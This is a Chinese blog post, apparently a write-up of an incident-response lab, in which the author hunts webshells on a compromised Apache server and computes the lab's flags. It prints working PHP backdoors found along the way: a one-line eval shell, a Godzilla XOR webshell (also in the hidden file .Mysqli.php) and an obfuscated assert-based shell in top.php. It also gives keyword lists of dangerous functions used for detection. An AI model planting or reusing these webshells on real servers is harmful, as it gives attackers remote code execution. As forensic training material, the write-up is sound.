{"pageProps":{"postData":{"id":"玄机第一章 应急响应-webshell查杀","contentHtml":"<h1>第一章 应急响应-webshell查杀</h1>\n<blockquote>\n<p><a href=\"https://xj.edisec.net/challenges/25\">https://xj.edisec.net/challenges/25</a></p>\n</blockquote>\n<p>1.黑客<code>webshell</code>里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</p>\n<p>2.黑客使用的什么工具的<code>shell github</code>地址的md5 flag{md5}</p>\n<p>3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx</p>\n<p>4.黑客免杀马完整路径 md5 flag{md5}</p>\n<h2>Webshell</h2>\n<p>使用<code>find</code>命令查找<code>.php</code>后缀文件，并且内容带有<code>eval</code>函数的文件</p>\n<blockquote>\n<p>PHP: <code>eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()</code>\nASP: <code>Execute(), Eval(), CreateObject()</code>\nJSP: <code>Runtime.getRuntime().exec()</code></p>\n</blockquote>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-4:/var/www/html/admin/template# find /var/www -name *.php* | xargs grep -r <span class=\"hljs-string\">'eval('</span>\n/var/www/html/include/gz.php:           <span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$payload</span>);\n/var/www/html/include/Db/.Mysqli.php:           <span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$payload</span>);\n/var/www/html/shell.php:&#x3C;?php phpinfo();@<span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$_REQUEST</span>[1]);?>\n</code></pre>\n<p>第三个毫无疑问是<code>webshell</code> ，不过没有<code>flag</code></p>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-4:/var/www/html# <span class=\"hljs-built_in\">cat</span> shell.php\n&#x3C;?php phpinfo();@<span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$_REQUEST</span>[1]);?>root@ip-10-0-10-4:/var/www/html#\n</code></pre>\n<p>再看<code>gz.php</code> 存在<code>flag</code> <code>flag{027ccd04-5065-48b6-a32d-77c704a5e26d}</code></p>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-4:/var/www/html# <span class=\"hljs-built_in\">cat</span> include/gz.php\n&#x3C;?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\n<span class=\"hljs-keyword\">function</span> encode(<span class=\"hljs-variable\">$D</span>,<span class=\"hljs-variable\">$K</span>){\n    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span>=0;<span class=\"hljs-variable\">$i</span>&#x3C;strlen(<span class=\"hljs-variable\">$D</span>);<span class=\"hljs-variable\">$i</span>++) {\n        <span class=\"hljs-variable\">$c</span> = <span class=\"hljs-variable\">$K</span>[<span class=\"hljs-variable\">$i</span>+1&#x26;15];\n        <span class=\"hljs-variable\">$D</span>[<span class=\"hljs-variable\">$i</span>] = <span class=\"hljs-variable\">$D</span>[<span class=\"hljs-variable\">$i</span>]^<span class=\"hljs-variable\">$c</span>;\n    }\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-variable\">$D</span>;\n}\n//027ccd04-5065-48b6-a32d-77c704a5e26d\n<span class=\"hljs-variable\">$payloadName</span>=<span class=\"hljs-string\">'payload'</span>;\n<span class=\"hljs-variable\">$key</span>=<span class=\"hljs-string\">'3c6e0b8a9c15224a'</span>;\n<span class=\"hljs-variable\">$data</span>=file_get_contents(<span class=\"hljs-string\">\"php://input\"</span>);\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$data</span>!==<span class=\"hljs-literal\">false</span>){\n    <span class=\"hljs-variable\">$data</span>=encode(<span class=\"hljs-variable\">$data</span>,<span class=\"hljs-variable\">$key</span>);\n    <span class=\"hljs-keyword\">if</span> (isset(<span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-variable\">$payloadName</span>])){\n        <span class=\"hljs-variable\">$payload</span>=encode(<span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-variable\">$payloadName</span>],<span class=\"hljs-variable\">$key</span>);\n        <span class=\"hljs-keyword\">if</span> (strpos(<span class=\"hljs-variable\">$payload</span>,<span class=\"hljs-string\">\"getBasicsInfo\"</span>)===<span class=\"hljs-literal\">false</span>){\n            <span class=\"hljs-variable\">$payload</span>=encode(<span class=\"hljs-variable\">$payload</span>,<span class=\"hljs-variable\">$key</span>);\n        }\n                <span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$payload</span>);\n        <span class=\"hljs-built_in\">echo</span> encode(@run(<span class=\"hljs-variable\">$data</span>),<span class=\"hljs-variable\">$key</span>);\n    }<span class=\"hljs-keyword\">else</span>{\n        <span class=\"hljs-keyword\">if</span> (strpos(<span class=\"hljs-variable\">$data</span>,<span class=\"hljs-string\">\"getBasicsInfo\"</span>)!==<span class=\"hljs-literal\">false</span>){\n            <span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-variable\">$payloadName</span>]=encode(<span class=\"hljs-variable\">$data</span>,<span class=\"hljs-variable\">$key</span>);\n        }\n    }\n}\n</code></pre>\n<blockquote>\n<p>这段代码的目的是接收通过 <code>php://input</code> 流发送的数据，对其进行编码，并根据会话变量中的内容执行特定的 PHP 代码。这通常用于隐藏恶意代码或后门，使得攻击者可以通过特定的请求触发执行。</p>\n</blockquote>\n<p>根据<code>shell</code>内容去搜索<code>github</code> （也根据<code>webshell</code>的特征）</p>\n<p><img src=\"/post-images/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/image.png\" alt=\"image.png\"></p>\n<p>对比之后是一样的，这就是黑客使用的<code>webshell</code></p>\n<p><img src=\"/post-images/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/image1.png\" alt=\"image.png\"></p>\n<p>看分类的得知是哥斯拉的<code>webshell</code> ，我们找到哥斯拉的<code>github</code> ： <a href=\"https://github.com/BeichenDream/Godzilla\">https://github.com/BeichenDream/Godzilla</a> 将链接其进行<code>md5</code>加密即可</p>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-4:~# <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"https://github.com/BeichenDream/Godzilla\"</span> | <span class=\"hljs-built_in\">md5sum</span>\n39392de3218c333f794befef07ac9257  -\n</code></pre>\n<h2>隐藏Webshell</h2>\n<p>查找隐藏<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-4:/var/www/html/include# find / -name *.php | xargs grep -r <span class=\"hljs-string\">\"exec(\"</span>\nModel/Spider.php:                       <span class=\"hljs-variable\">$content</span> = curl_exec(<span class=\"hljs-variable\">$ch</span>);\nDb/Sqlite.php:                  <span class=\"hljs-variable\">$query</span> = sqlite_exec(<span class=\"hljs-variable\">$this</span>->conn,<span class=\"hljs-variable\">$sql</span>,<span class=\"hljs-variable\">$error</span>);\n\nroot@ip-10-0-10-4:/var/www/html/include/Db# <span class=\"hljs-built_in\">ls</span> -al\ntotal 36\ndrwxr-xr-x 2 www-data www-data 4096 Aug  2  2023 .\ndrwxr-xr-x 4 www-data www-data 4096 Aug  2  2023 ..\n-rw-r--r-- 1 www-data www-data  768 Aug  2  2023 .Mysqli.php\n-rwxr-xr-x 1 www-data www-data 4752 Mar 14  2021 Mysqli.php\n-rwxr-xr-x 1 www-data www-data 4921 Mar 14  2021 Mysql.php\n-rwxr-xr-x 1 www-data www-data 4433 Mar 14  2021 Sqlite.php\nroot@ip-10-0-10-4:/var/www/html/include/Db# <span class=\"hljs-built_in\">cat</span> .Mysqli.php\n&#x3C;?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\n<span class=\"hljs-keyword\">function</span> encode(<span class=\"hljs-variable\">$D</span>,<span class=\"hljs-variable\">$K</span>){\n    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span>=0;<span class=\"hljs-variable\">$i</span>&#x3C;strlen(<span class=\"hljs-variable\">$D</span>);<span class=\"hljs-variable\">$i</span>++) {\n        <span class=\"hljs-variable\">$c</span> = <span class=\"hljs-variable\">$K</span>[<span class=\"hljs-variable\">$i</span>+1&#x26;15];\n        <span class=\"hljs-variable\">$D</span>[<span class=\"hljs-variable\">$i</span>] = <span class=\"hljs-variable\">$D</span>[<span class=\"hljs-variable\">$i</span>]^<span class=\"hljs-variable\">$c</span>;\n    }\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-variable\">$D</span>;\n}\n<span class=\"hljs-variable\">$payloadName</span>=<span class=\"hljs-string\">'payload'</span>;\n<span class=\"hljs-variable\">$key</span>=<span class=\"hljs-string\">'3c6e0b8a9c15224a'</span>;\n<span class=\"hljs-variable\">$data</span>=file_get_contents(<span class=\"hljs-string\">\"php://input\"</span>);\n<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$data</span>!==<span class=\"hljs-literal\">false</span>){\n    <span class=\"hljs-variable\">$data</span>=encode(<span class=\"hljs-variable\">$data</span>,<span class=\"hljs-variable\">$key</span>);\n    <span class=\"hljs-keyword\">if</span> (isset(<span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-variable\">$payloadName</span>])){\n        <span class=\"hljs-variable\">$payload</span>=encode(<span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-variable\">$payloadName</span>],<span class=\"hljs-variable\">$key</span>);\n        <span class=\"hljs-keyword\">if</span> (strpos(<span class=\"hljs-variable\">$payload</span>,<span class=\"hljs-string\">\"getBasicsInfo\"</span>)===<span class=\"hljs-literal\">false</span>){\n            <span class=\"hljs-variable\">$payload</span>=encode(<span class=\"hljs-variable\">$payload</span>,<span class=\"hljs-variable\">$key</span>);\n        }\n                <span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$payload</span>);\n        <span class=\"hljs-built_in\">echo</span> encode(@run(<span class=\"hljs-variable\">$data</span>),<span class=\"hljs-variable\">$key</span>);\n    }<span class=\"hljs-keyword\">else</span>{\n        <span class=\"hljs-keyword\">if</span> (strpos(<span class=\"hljs-variable\">$data</span>,<span class=\"hljs-string\">\"getBasicsInfo\"</span>)!==<span class=\"hljs-literal\">false</span>){\n            <span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-variable\">$payloadName</span>]=encode(<span class=\"hljs-variable\">$data</span>,<span class=\"hljs-variable\">$key</span>);\n        }\n    }\n}\n</code></pre>\n<p>隐藏<code>shell</code>是<code>.Mysqli.php</code></p>\n<p>那么完整路径就是:<code>/var/www/html/include/Db/.Mysqli.php</code></p>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-4:~# <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"/var/www/html/include/Db/.Mysqli.php\"</span> | <span class=\"hljs-built_in\">md5sum</span>\naebac0e58cd6c5fad1695ee4d1ac1919  -\n</code></pre>\n<h2>免杀Webshell</h2>\n<p>黑客还放了一个免杀马，免杀马已经不能被静态检查到了，因为在免杀的过程中将<code>websell</code>特征都给去掉了，那么我们可以查看日志文件中存在什么可疑的记录</p>\n<p>服务器当前用的是<code>apache</code>的服务器，我们找到日志分析，其中几条传进来的尝试很可疑，并且经过<code>base64</code>加密<code>fuc=ERsDHgEUC1hI&#x26;func2=ser</code></p>\n<p><img src=\"/post-images/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80/image2.png\" alt=\"image.png\"></p>\n<p><code>top.php</code> 源码</p>\n<pre><code class=\"hljs language-bash\">root@ip-10-0-10-4:/var/www/html/wap# <span class=\"hljs-built_in\">cat</span> top.php\n&#x3C;?php\n\n<span class=\"hljs-variable\">$key</span> = <span class=\"hljs-string\">\"password\"</span>;\n\n//ERsDHgEUC1hI\n<span class=\"hljs-variable\">$fun</span> = base64_decode(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'func'</span>]);\n<span class=\"hljs-keyword\">for</span>(<span class=\"hljs-variable\">$i</span>=0;<span class=\"hljs-variable\">$i</span>&#x3C;strlen(<span class=\"hljs-variable\">$fun</span>);<span class=\"hljs-variable\">$i</span>++){\n    <span class=\"hljs-variable\">$fun</span>[<span class=\"hljs-variable\">$i</span>] = <span class=\"hljs-variable\">$fun</span>[<span class=\"hljs-variable\">$i</span>]^<span class=\"hljs-variable\">$key</span>[<span class=\"hljs-variable\">$i</span>+1&#x26;7];\n}\n<span class=\"hljs-variable\">$a</span> = <span class=\"hljs-string\">\"a\"</span>;\n<span class=\"hljs-variable\">$s</span> = <span class=\"hljs-string\">\"s\"</span>;\n<span class=\"hljs-variable\">$c</span>=<span class=\"hljs-variable\">$a</span>.<span class=\"hljs-variable\">$s</span>.<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">\"func2\"</span>];\n<span class=\"hljs-variable\">$c</span>(<span class=\"hljs-variable\">$fun</span>);root@ip-10-0-10-4:/var/www/html/wap#\n</code></pre>\n<p>生成<code>flag</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-variable\">$c</span>(<span class=\"hljs-variable\">$fun</span>);root@ip-10-0-10-4:/var/www/html/wap# <span class=\"hljs-built_in\">echo</span> -n <span class=\"hljs-string\">\"/var/www/html/wap/top.php\"</span> | <span class=\"hljs-built_in\">md5sum</span>\neeff2eabfd9b7a6d26fc1a53d3f7d1de  -\n</code></pre>","title":"玄机 - 第一章 应急响应-webshell查杀","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["玄机","应急响应","日志分析"],"categories":"靶机","description":"第一章 应急响应-webshell查杀\n\n https://xj.edisec.net/challenges/25\n \n\n1.黑客`webshell`里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}\n\n2.黑客使用的什么工具的`shell github`地址的md5 flag{md5}\n\n3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/..."},"recentPosts":[{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"}]},"__N_SSG":true}